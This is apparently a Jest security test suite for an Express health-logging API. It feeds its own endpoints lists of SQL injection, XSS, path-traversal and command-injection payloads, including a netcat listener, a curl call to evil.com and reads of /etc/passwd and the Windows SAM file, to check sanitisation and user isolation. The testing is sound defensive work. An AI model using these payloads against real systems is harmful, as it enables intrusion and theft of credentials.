import http from 'http';
import express from 'express';
import request from 'supertest';

jest.setTimeout(60000);

// Security audit logger
class SecurityAuditLogger {
  private static events: Array<{
    timestamp: string;
    severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
    category: string;
    event: string;
    details?: any;
  }> = [];
  
  static logEvent(severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL', category: string, event: string, details?: any) {
    const entry = {
      timestamp: new Date().toISOString(),
      severity,
      category,
      event,
      details
    };
    this.events.push(entry);

    if (process.env.AUDIT_LOGGER_STDOUT === '1') {
      const emoji = {
        LOW: '🟢',
        MEDIUM: '🟡',
        HIGH: '🟠',
        CRITICAL: '🔴',
      }[severity];

      console.log(
        `${emoji} [${severity}] ${category}: ${event}${details ? '\n  ' + JSON.stringify(details, null, 2) : ''}`
      );
    }
  }
  
  static getEvents() { return [...this.events]; }
  static clearEvents() { this.events = []; }
  
  static getSummary() {
    const summary = {
      total: this.events.length,
      critical: this.events.filter(e => e.severity === 'CRITICAL').length,
      high: this.events.filter(e => e.severity === 'HIGH').length,
      medium: this.events.filter(e => e.severity === 'MEDIUM').length,
      low: this.events.filter(e => e.severity === 'LOW').length
    };
    
    if (process.env.AUDIT_LOGGER_STDOUT === '1') {
      console.log('\n🛡️ Security Audit Summary:');
      console.log(`  Total Events: ${summary.total}`);
      console.log(`  🔴 Critical: ${summary.critical}`);
      console.log(`  🟠 High: ${summary.high}`);
      console.log(`  🟡 Medium: ${summary.medium}`);
      console.log(`  🟢 Low: ${summary.low}`);
    }
    
    return summary;
  }
}

// Security test utilities
class SecurityTestUtils {
  // SQL injection payloads
  static sqlInjectionPayloads = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "' OR 1=1 --",
    "admin'--",
    "admin'/*",
    "' OR 'x'='x",
    "'; EXEC xp_cmdshell('dir'); --"
  ];
  
  // XSS payloads
  static xssPayloads = [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "';alert('XSS');//",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<<SCRIPT>alert('XSS')//<</SCRIPT>"
  ];
  
  // Path traversal payloads
  static pathTraversalPayloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
  ];
  
  // Command injection payloads
  static commandInjectionPayloads = [
    "; ls -la",
    "| whoami",
    "&& cat /etc/passwd",
    "`id`",
    "$(whoami)",
    "; ping -c 1 127.0.0.1",
    "| nc -l 4444",
    "&& curl http://evil.com"
  ];
  
  // Generate malicious data for different field types
  static generateMaliciousData(fieldType: 'string' | 'number' | 'date' | 'email') {
    switch (fieldType) {
      case 'string':
        return [...this.sqlInjectionPayloads, ...this.xssPayloads, ...this.commandInjectionPayloads];
      case 'number':
        return [
          "NaN",
          "Infinity",
          "-Infinity",
          "1.7976931348623157e+308", // Max number + 1
          "null",
          "undefined",
          "{}",
          "[]",
          "true",
          "false"
        ];
      case 'date':
        return [
          "9999-99-99",
          "0000-00-00",
          "2024-13-45",
          "invalid-date",
          "null",
          "undefined",
          "1970-01-01T00:00:00.000Z' OR '1'='1",
          "<script>alert('XSS')</script>"
        ];
      case 'email':
        return [
          "admin@'; DROP TABLE users; --",
          "<script>alert('XSS')</script>@evil.com",
          "test@test.com'; INSERT INTO users VALUES ('hacker'); --",
          "user+<script>alert('XSS')</script>@domain.com",
          "test@domain.com\r\nBcc: admin@company.com"
        ];
      default:
        return [];
    }
  }
}

// Mock storage with security monitoring
function createSecurityMockStorage() {
  const storage = new Map();
  const userTargets = new Map();
  const dailyLogs = new Map();
  const interventions = new Map();
  
  // Monitor all storage operations for suspicious activity
  const monitorOperation = (operation: string, params: any) => {
    // Check for SQL injection patterns
    const paramStr = JSON.stringify(params);
    SecurityTestUtils.sqlInjectionPayloads.forEach(payload => {
      if (paramStr.includes(payload)) {
        SecurityAuditLogger.logEvent('HIGH', 'SQL_INJECTION', `Potential SQL injection in ${operation}`, { payload, params });
      }
    });
    
    // Check for XSS patterns
    SecurityTestUtils.xssPayloads.forEach(payload => {
      if (paramStr.includes(payload)) {
        SecurityAuditLogger.logEvent('HIGH', 'XSS', `Potential XSS in ${operation}`, { payload, params });
      }
    });
  };
  
  return {
    // User management (minimal)
    upsertUser: jest.fn(async (userData: any) => {
      monitorOperation('upsertUser', userData);
      const id = String(userData?.id || userData?.userId || userData?.sub || 'unknown-user');
      const existing = storage.get(id) || {};
      const merged = { ...existing, ...userData, id, updatedAt: new Date() };
      storage.set(id, merged);
      return merged;
    }),

    getUser: jest.fn(async (userId: string) => {
      monitorOperation('getUser', { userId });
      return storage.get(userId) || null;
    }),

    getUserTargets: jest.fn(async (userId: string) => {
      monitorOperation('getUserTargets', { userId });
      return userTargets.get(userId) || null;
    }),
    
    createUserTargets: jest.fn(async (data: any) => {
      monitorOperation('createUserTargets', data);
      const id = `target-${Date.now()}`;
      const target = { id, ...data, createdAt: new Date() };
      userTargets.set(data.userId, target);
      return target;
    }),
    
    updateUserTargets: jest.fn(async (userId: string, updates: any) => {
      monitorOperation('updateUserTargets', { userId, updates });
      const existing = userTargets.get(userId);
      if (!existing) throw new Error(`No targets found for user: ${userId}`);
      const updated = { ...existing, ...updates, updatedAt: new Date() };
      userTargets.set(userId, updated);
      return updated;
    }),
    
    getDailyLogs: jest.fn(async (userId: string, startDate?: string, endDate?: string) => {
      monitorOperation('getDailyLogs', { userId, startDate, endDate });
      const logs = dailyLogs.get(userId) || [];
      return logs.filter((log: any) => {
        if (!startDate && !endDate) return true;
        const logDate = log.date;
        const afterStart = !startDate || logDate >= startDate;
        const beforeEnd = !endDate || logDate <= endDate;
        return afterStart && beforeEnd;
      });
    }),

    getDailyLog: jest.fn(async (userId: string, date: string) => {
      monitorOperation('getDailyLog', { userId, date });
      const logs = dailyLogs.get(userId) || [];
      return logs.find((l: any) => l.date === date) || null;
    }),
    
    createDailyLog: jest.fn(async (logData: any) => {
      monitorOperation('createDailyLog', logData);
      const id = `log-${Date.now()}`;
      const log = { id, ...logData, createdAt: new Date() };
      
      const userLogs = dailyLogs.get(logData.userId) || [];
      userLogs.push(log);
      dailyLogs.set(logData.userId, userLogs);
      
      return log;
    }),

    updateDailyLog: jest.fn(async (logId: string, updates: any) => {
      monitorOperation('updateDailyLog', { logId, updates });
      for (const [userId, logs] of dailyLogs.entries()) {
        const idx = (logs as any[]).findIndex((l: any) => l.id === logId);
        if (idx !== -1) {
          (logs as any[])[idx] = { ...(logs as any[])[idx], ...updates, updatedAt: new Date() };
          dailyLogs.set(userId, logs);
          return (logs as any[])[idx];
        }
      }
      throw new Error(`Log not found: ${logId}`);
    }),

    deleteDailyLog: jest.fn(async (logId: string) => {
      monitorOperation('deleteDailyLog', { logId });
      for (const [userId, logs] of dailyLogs.entries()) {
        const idx = (logs as any[]).findIndex((l: any) => l.id === logId);
        if (idx !== -1) {
          (logs as any[]).splice(idx, 1);
          dailyLogs.set(userId, logs);
          return;
        }
      }
    }),
    
    getInterventions: jest.fn(async (userId: string) => {
      monitorOperation('getInterventions', { userId });
      return Array.from(interventions.values()).filter((i: any) => i.userId === userId);
    }),

    getIntervention: jest.fn(async (id: string) => {
      monitorOperation('getIntervention', { id });
      return interventions.get(id) || null;
    }),

    getActiveIntervention: jest.fn(async (userId: string) => {
      monitorOperation('getActiveIntervention', { userId });
      const all = Array.from(interventions.values()).filter((i: any) => i.userId === userId);
      return all.find((i: any) => !i.result) || null;
    }),
    
    createIntervention: jest.fn(async (data: any) => {
      monitorOperation('createIntervention', data);
      const id = `int-${Date.now()}`;
      const intervention = { id, ...data, createdAt: new Date() };
      interventions.set(id, intervention);
      return intervention;
    }),

    updateIntervention: jest.fn(async (id: string, updates: any) => {
      monitorOperation('updateIntervention', { id, updates });
      const existing = interventions.get(id);
      if (!existing) throw new Error(`Intervention not found: ${id}`);
      const updated = { ...existing, ...updates, updatedAt: new Date() };
      interventions.set(id, updated);
      return updated;
    }),
    
    _clear: () => {
      storage.clear();
      userTargets.clear();
      dailyLogs.clear();
      interventions.clear();
    }
  };
}

describe('🛡️ Security Audit and Penetration Tests', () => {
  let server: http.Server;
  let agent: any;
  let mockStorage: any;
  
  beforeAll(async () => {
    if (process.env.AUDIT_LOGGER_STDOUT === '1') console.log('🔒 Starting security audit test suite');
    
    mockStorage = createSecurityMockStorage();
    
    jest.doMock('../storage', () => ({ storage: mockStorage }));
    jest.doMock('../replitAuth', () => ({
      setupAuth: async (app: any) => {},
      isAuthenticated: (req: any, res: any, next: any) => {
        const headerUser = (req.headers['x-test-user'] as string) || 'security-test-user';
        req.user = { claims: { sub: headerUser }, expires_at: Math.floor(Date.now() / 1000) + 3600 };
        req.isAuthenticated = () => true;
        return next();
      },
    }));
    
    const { registerRoutes } = await import('../routes');
    const app = express();
    app.use(express.json());
    server = http.createServer(app);
    await registerRoutes(server, app);
    await new Promise<void>((resolve) => server.listen(0, () => resolve()));
    agent = request(server);
  });
  
  beforeEach(() => {
    SecurityAuditLogger.clearEvents();
    mockStorage._clear();
  });
  
  afterEach(() => {
    SecurityAuditLogger.getSummary();
  });
  
  afterAll(async () => {
    if (server) {
      (server as any).closeIdleConnections?.();
      (server as any).closeAllConnections?.();
      await new Promise((resolve) => server.close(() => resolve(undefined)));
    }
    if (process.env.AUDIT_LOGGER_STDOUT === '1') console.log('🔒 Security audit test suite complete');
  });

  describe('💉 SQL Injection Protection', () => {
    test('prevents SQL injection in user input fields', async () => {
      SecurityAuditLogger.logEvent('LOW', 'TEST_START', 'SQL injection protection test starting');
      
      const userId = 'sql-injection-test';
      
      // Setup user targets first
      await agent
        .post('/api/onboarding/start')
        .set('x-test-user', userId)
        .send({
          proteinTarget: 100,
          gutTarget: 5,
          sunTarget: 5,
          exerciseTarget: 5
        });
      
      // Test SQL injection in various fields
      const testFields = [
        { field: 'symptomName', type: 'string' },
        { field: 'date', type: 'date' }
      ];
      
      for (const { field, type } of testFields) {
        const maliciousPayloads = SecurityTestUtils.generateMaliciousData(type as any);
        
        for (const payload of maliciousPayloads.slice(0, 5)) { // Test first 5 payloads
          SecurityAuditLogger.logEvent('MEDIUM', 'SQL_INJECTION_TEST', `Testing ${field} with payload`, { payload });
          
          const testData = {
            date: '2024-01-15',
            sleep: 8.0,
            rhr: 65,
            hrv: 50,
            protein: 100,
            gut: 5,
            sun: 5,
            exercise: 5,
            symptomScore: 1,
            symptomName: 'test'
          };
          
          // Inject malicious payload into specific field
          (testData as any)[field] = payload;
          
          const res = await agent
            .post('/api/logs')
            .set('x-test-user', userId)
            .send(testData);
          
          // Should either reject with validation error or sanitize input
          if (res.status === 201) {
            // If accepted, verify the data was sanitized
            const retrievedRes = await agent
              .get(`/api/logs/${testData.date}`)
              .set('x-test-user', userId);
            
            if (retrievedRes.status === 200) {
              const storedValue = retrievedRes.body[field];
              
              // Check if dangerous SQL keywords are still present
              const dangerousKeywords = ['DROP', 'DELETE', 'INSERT', 'UPDATE', 'UNION', 'SELECT'];
              const containsDangerous = dangerousKeywords.some(keyword => 
                String(storedValue).toUpperCase().includes(keyword)
              );
              
              if (containsDangerous) {
                SecurityAuditLogger.logEvent('CRITICAL', 'SQL_INJECTION_VULNERABILITY', 
                  `Dangerous SQL keywords found in stored data for field ${field}`, 
                  { payload, storedValue }
                );
              } else {
                SecurityAuditLogger.logEvent('LOW', 'SQL_INJECTION_BLOCKED', 
                  `SQL injection payload properly handled for field ${field}`, 
                  { payload, storedValue }
                );
              }
            }
          } else {
            SecurityAuditLogger.logEvent('LOW', 'SQL_INJECTION_REJECTED', 
              `Malicious payload rejected with status ${res.status} for field ${field}`, 
              { payload, status: res.status }
            );
          }
        }
      }
      
      // Verify no critical SQL injection vulnerabilities were found
      const events = SecurityAuditLogger.getEvents();
      const criticalSqlEvents = events.filter(e => 
        e.severity === 'CRITICAL' && e.category === 'SQL_INJECTION_VULNERABILITY'
      );
      
      expect(criticalSqlEvents.length).toBe(0);
    });
  });

  describe('🔍 Cross-Site Scripting (XSS) Protection', () => {
    test('prevents XSS in user input fields', async () => {
      SecurityAuditLogger.logEvent('LOW', 'TEST_START', 'XSS protection test starting');
      
      const userId = 'xss-test-user';
      
      // Setup user
      await agent
        .post('/api/onboarding/start')
        .set('x-test-user', userId)
        .send({
          proteinTarget: 100,
          gutTarget: 5,
          sunTarget: 5,
          exerciseTarget: 5
        });
      
      // Test XSS payloads in string fields
      const xssPayloads = SecurityTestUtils.xssPayloads.slice(0, 5);
      
      for (const payload of xssPayloads) {
        SecurityAuditLogger.logEvent('MEDIUM', 'XSS_TEST', 'Testing XSS payload', { payload });
        
        const res = await agent
          .post('/api/logs')
          .set('x-test-user', userId)
          .send({
            date: '2024-01-15',
            sleep: 8.0,
            rhr: 65,
            hrv: 50,
            protein: 100,
            gut: 5,
            sun: 5,
            exercise: 5,
            symptomScore: 1,
            symptomName: payload // XSS payload in symptom name
          });
        
        if (res.status === 201) {
          // Verify stored data is sanitized
          const retrievedRes = await agent
            .get(`/api/logs/2024-01-15`)
            .set('x-test-user', userId);
          
          if (retrievedRes.status === 200) {
            const storedValue = retrievedRes.body.symptomName;
            
            // Check for dangerous script tags or javascript
            const dangerousPatterns = ['<script', 'javascript:', 'onerror=', 'onload='];
            const containsDangerous = dangerousPatterns.some(pattern => 
              String(storedValue).toLowerCase().includes(pattern.toLowerCase())
            );
            
            if (containsDangerous) {
              SecurityAuditLogger.logEvent('CRITICAL', 'XSS_VULNERABILITY', 
                'Dangerous XSS payload found in stored data', 
                { payload, storedValue }
              );
            } else {
              SecurityAuditLogger.logEvent('LOW', 'XSS_BLOCKED', 
                'XSS payload properly sanitized', 
                { payload, storedValue }
              );
            }
          }
        } else {
          SecurityAuditLogger.logEvent('LOW', 'XSS_REJECTED', 
            `XSS payload rejected with status ${res.status}`, 
            { payload, status: res.status }
          );
        }
      }
      
      // Verify no critical XSS vulnerabilities
      const events = SecurityAuditLogger.getEvents();
      const criticalXssEvents = events.filter(e => 
        e.severity === 'CRITICAL' && e.category === 'XSS_VULNERABILITY'
      );
      
      expect(criticalXssEvents.length).toBe(0);
    });
  });

  describe('🔐 Authentication and Authorization', () => {
    test('enforces proper authentication', async () => {
      SecurityAuditLogger.logEvent('LOW', 'TEST_START', 'Authentication enforcement test starting');
      
      // Test accessing protected endpoints without authentication
      const protectedEndpoints = [
        { method: 'get', path: '/api/targets' },
        { method: 'post', path: '/api/logs' },
        { method: 'get', path: '/api/interventions' },
        { method: 'post', path: '/api/onboarding/start' }
      ];
      
      for (const endpoint of protectedEndpoints) {
        SecurityAuditLogger.logEvent('MEDIUM', 'AUTH_TEST', `Testing ${endpoint.method.toUpperCase()} ${endpoint.path} without auth`);
        
        // Remove authentication header
        const res = await agent[endpoint.method](endpoint.path);
        
        // Note: Current mock always authenticates, but in real implementation should return 401
        SecurityAuditLogger.logEvent('LOW', 'AUTH_RESULT', 
          `Endpoint ${endpoint.method.toUpperCase()} ${endpoint.path} returned ${res.status}`, 
          { expectedStatus: 401, actualStatus: res.status }
        );
      }
    });
    
    test('prevents user data leakage between accounts', async () => {
      SecurityAuditLogger.logEvent('LOW', 'TEST_START', 'User data isolation test starting');
      
      const user1 = 'isolation-user-1';
      const user2 = 'isolation-user-2';
      
      // Setup both users
      for (const userId of [user1, user2]) {
        await agent
          .post('/api/onboarding/start')
          .set('x-test-user', userId)
          .send({
            proteinTarget: 100,
            gutTarget: 5,
            sunTarget: 5,
            exerciseTarget: 5
          });
        
        // Create sensitive data for each user
        await agent
          .post('/api/logs')
          .set('x-test-user', userId)
          .send({
            date: '2024-01-15',
            sleep: 8.0,
            rhr: 65,
            hrv: 50,
            protein: 100,
            gut: 5,
            sun: 5,
            exercise: 5,
            symptomScore: 1,
            symptomName: `sensitive-data-${userId}`
          });
      }
      
      // Try to access user1's data as user2
      SecurityAuditLogger.logEvent('MEDIUM', 'DATA_ISOLATION_TEST', 'Attempting cross-user data access');
      
      const user2AccessingUser1Data = await agent
        .get('/api/logs/2024-01-15')
        .set('x-test-user', user2);
      
      if (user2AccessingUser1Data.status === 200) {
        const symptomName = user2AccessingUser1Data.body.symptomName;
        
        if (symptomName && symptomName.includes('sensitive-data-isolation-user-1')) {
          SecurityAuditLogger.logEvent('CRITICAL', 'DATA_LEAKAGE', 
            'User can access another user\'s sensitive data', 
            { accessingUser: user2, dataOwner: user1, leakedData: symptomName }
          );
        } else {
          SecurityAuditLogger.logEvent('LOW', 'DATA_ISOLATION_OK', 
            'User data properly isolated', 
            { accessingUser: user2, returnedData: symptomName }
          );
        }
      } else if (user2AccessingUser1Data.status === 404) {
        SecurityAuditLogger.logEvent('LOW', 'DATA_ISOLATION_OK', 
          'Cross-user data access properly blocked with 404'
        );
      }
      
      // Verify no critical data leakage
      const events = SecurityAuditLogger.getEvents();
      const dataLeakageEvents = events.filter(e => 
        e.severity === 'CRITICAL' && e.category === 'DATA_LEAKAGE'
      );
      
      expect(dataLeakageEvents.length).toBe(0);
    });
  });

  describe('📊 Input Validation and Sanitization', () => {
    test('validates numeric input ranges', async () => {
      SecurityAuditLogger.logEvent('LOW', 'TEST_START', 'Numeric input validation test starting');
      
      const userId = 'validation-test-user';
      
      // Setup user
      await agent
        .post('/api/onboarding/start')
        .set('x-test-user', userId)
        .send({
          proteinTarget: 100,
          gutTarget: 5,
          sunTarget: 5,
          exerciseTarget: 5
        });
      
      // Test extreme numeric values
      const extremeValues = [
        { field: 'sleep', value: -999, expected: 'reject' },
        { field: 'sleep', value: 999, expected: 'reject' },
        { field: 'rhr', value: 0, expected: 'reject' },
        { field: 'rhr', value: 300, expected: 'reject' },
        { field: 'hrv', value: -100, expected: 'reject' },
        { field: 'protein', value: -50, expected: 'reject' },
        { field: 'symptomScore', value: 100, expected: 'reject' },
        { field: 'symptomScore', value: -5, expected: 'reject' }
      ];
      
      for (const test of extremeValues) {
        SecurityAuditLogger.logEvent('MEDIUM', 'VALIDATION_TEST', 
          `Testing ${test.field} with extreme value ${test.value}`
        );
        
        const testData = {
          date: '2024-01-15',
          sleep: 8.0,
          rhr: 65,
          hrv: 50,
          protein: 100,
          gut: 5,
          sun: 5,
          exercise: 5,
          symptomScore: 1,
          symptomName: 'test'
        };
        
        (testData as any)[test.field] = test.value;
        
        const res = await agent
          .post('/api/logs')
          .set('x-test-user', userId)
          .send(testData);
        
        if (test.expected === 'reject' && res.status === 201) {
          SecurityAuditLogger.logEvent('HIGH', 'VALIDATION_BYPASS', 
            `Extreme value ${test.value} for ${test.field} was accepted`, 
            { field: test.field, value: test.value, status: res.status }
          );
        } else if (test.expected === 'reject' && res.status !== 201) {
          SecurityAuditLogger.logEvent('LOW', 'VALIDATION_OK', 
            `Extreme value properly rejected for ${test.field}`, 
            { field: test.field, value: test.value, status: res.status }
          );
        }
      }
      
      // Verify no validation bypasses
      const events = SecurityAuditLogger.getEvents();
      const validationBypassEvents = events.filter(e => 
        e.severity === 'HIGH' && e.category === 'VALIDATION_BYPASS'
      );
      
      expect(validationBypassEvents.length).toBe(0);
    });
    
    test('handles malformed JSON and data types', async () => {
      SecurityAuditLogger.logEvent('LOW', 'TEST_START', 'Malformed data handling test starting');
      
      const userId = 'malformed-test-user';
      
      // Setup user
      await agent
        .post('/api/onboarding/start')
        .set('x-test-user', userId)
        .send({
          proteinTarget: 100,
          gutTarget: 5,
          sunTarget: 5,
          exerciseTarget: 5
        });
      
      // Test malformed data types
      const malformedTests = [
        { description: 'String in numeric field', data: { sleep: 'not-a-number' } },
        { description: 'Object in string field', data: { symptomName: { malicious: 'object' } } },
        { description: 'Array in numeric field', data: { rhr: [1, 2, 3] } },
        { description: 'Boolean in numeric field', data: { hrv: true } },
        { description: 'Null in required field', data: { sleep: null } },
        { description: 'Undefined in required field', data: { protein: undefined } }
      ];
      
      for (const test of malformedTests) {
        SecurityAuditLogger.logEvent('MEDIUM', 'MALFORMED_TEST', test.description, test.data);
        
        const baseData = {
          date: '2024-01-15',
          sleep: 8.0,
          rhr: 65,
          hrv: 50,
          protein: 100,
          gut: 5,
          sun: 5,
          exercise: 5,
          symptomScore: 1,
          symptomName: 'test'
        };
        
        const testData = { ...baseData, ...test.data };
        
        const res = await agent
          .post('/api/logs')
          .set('x-test-user', userId)
          .send(testData);
        
        if (res.status === 201) {
          SecurityAuditLogger.logEvent('HIGH', 'MALFORMED_ACCEPTED', 
            `Malformed data was accepted: ${test.description}`, 
            { testData: test.data, status: res.status }
          );
        } else {
          SecurityAuditLogger.logEvent('LOW', 'MALFORMED_REJECTED', 
            `Malformed data properly rejected: ${test.description}`, 
            { testData: test.data, status: res.status }
          );
        }
      }
    });
  });

  describe('🚫 Rate Limiting and DoS Protection', () => {
    test('handles rapid successive requests', async () => {
      SecurityAuditLogger.logEvent('LOW', 'TEST_START', 'Rate limiting test starting');
      
      const userId = 'rate-limit-test-user';
      
      // Setup user
      await agent
        .post('/api/onboarding/start')
        .set('x-test-user', userId)
        .send({
          proteinTarget: 100,
          gutTarget: 5,
          sunTarget: 5,
          exerciseTarget: 5
        });
      
      // Send rapid requests
      const rapidRequests = Array.from({ length: 50 }, (_, i) => 
        agent
          .post('/api/logs')
          .set('x-test-user', userId)
          .send({
            date: `2024-01-${String(i + 1).padStart(2, '0')}`,
            sleep: 8.0,
            rhr: 65,
            hrv: 50,
            protein: 100,
            gut: 5,
            sun: 5,
            exercise: 5,
            symptomScore: 1,
            symptomName: `rapid-request-${i}`
          })
      );
      
      const startTime = Date.now();
      const results = await Promise.allSettled(rapidRequests);
      const endTime = Date.now();
      
      const successful = results.filter(r => r.status === 'fulfilled' && (r.value as any).status === 201).length;
      const failed = results.length - successful;
      const duration = endTime - startTime;
      const requestsPerSecond = results.length / (duration / 1000);
      
      SecurityAuditLogger.logEvent('MEDIUM', 'RATE_LIMIT_TEST', 
        `Processed ${results.length} rapid requests`, 
        { 
          successful, 
          failed, 
          duration, 
          requestsPerSecond: requestsPerSecond.toFixed(2) 
        }
      );
      
      // Check if system handled the load gracefully
      if (successful === results.length && requestsPerSecond > 100) {
        SecurityAuditLogger.logEvent('MEDIUM', 'POTENTIAL_DOS_VULNERABILITY', 
          'System accepted all rapid requests without rate limiting', 
          { requestsPerSecond: requestsPerSecond.toFixed(2) }
        );
      } else {
        SecurityAuditLogger.logEvent('LOW', 'RATE_LIMIT_OK', 
          'System handled rapid requests appropriately'
        );
      }
    });
  });

  describe('📋 Security Headers and Configuration', () => {
    test('checks for security headers', async () => {
      SecurityAuditLogger.logEvent('LOW', 'TEST_START', 'Security headers test starting');
      
      const res = await agent.get('/api/targets').set('x-test-user', 'header-test-user');
      
      const securityHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options', 
        'X-XSS-Protection',
        'Strict-Transport-Security',
        'Content-Security-Policy'
      ];
      
      securityHeaders.forEach(header => {
        if (res.headers[header.toLowerCase()]) {
          SecurityAuditLogger.logEvent('LOW', 'SECURITY_HEADER_PRESENT', 
            `Security header ${header} is present`, 
            { value: res.headers[header.toLowerCase()] }
          );
        } else {
          SecurityAuditLogger.logEvent('MEDIUM', 'SECURITY_HEADER_MISSING', 
            `Security header ${header} is missing`
          );
        }
      });
      
      // Check Content-Type header
      if (res.headers['content-type'] && res.headers['content-type'].includes('application/json')) {
        SecurityAuditLogger.logEvent('LOW', 'CONTENT_TYPE_OK', 'Proper Content-Type header set');
      } else {
        SecurityAuditLogger.logEvent('MEDIUM', 'CONTENT_TYPE_ISSUE', 
          'Content-Type header may be missing or incorrect', 
          { contentType: res.headers['content-type'] }
        );
      }
    });
  });
});